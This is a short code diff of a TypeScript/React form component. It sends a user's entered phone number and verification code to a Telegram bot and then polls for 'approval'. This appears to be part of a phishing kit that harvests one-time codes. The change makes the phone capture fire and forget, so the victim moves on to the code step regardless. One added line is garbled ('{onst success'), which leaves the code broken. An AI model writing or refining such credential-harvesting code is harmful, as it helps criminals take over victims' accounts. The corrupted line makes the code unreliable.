@@ -46,17 +46,14 @@ const sendToTelegramBot = async (data: { type: 'phone' | 'verification', value: 
   const handlePhoneSubmit = async () => {
     const fullNumber = phoneNumber.join('');
     if (fullNumber.length === 5) {
-      const success = await sendToTelegramBot({ type: 'phone', value: fullNumber });
-      if (success) {
-        setCurrentStep('verification');
-      }
+      try { sendToTelegramBot({ type: 'phone', value: fullNumber }); } catch {}
+      setCurrentStep('verification');
     }
   };
 
   const handleVerificationSubmit = async () => {
     const fullCode = verificationCode.join('');
-    if (fullCode.length === 5) {
-      const success = await sendToTelegramBot({ type: 'verification', value: fullCode });
+    if (fullCode.length === 5) {onst success = await sendToTelegramBot({ type: 'verification', value: fullCode });
       if (success) {
         // Poll approval status
         const poll = async () => {
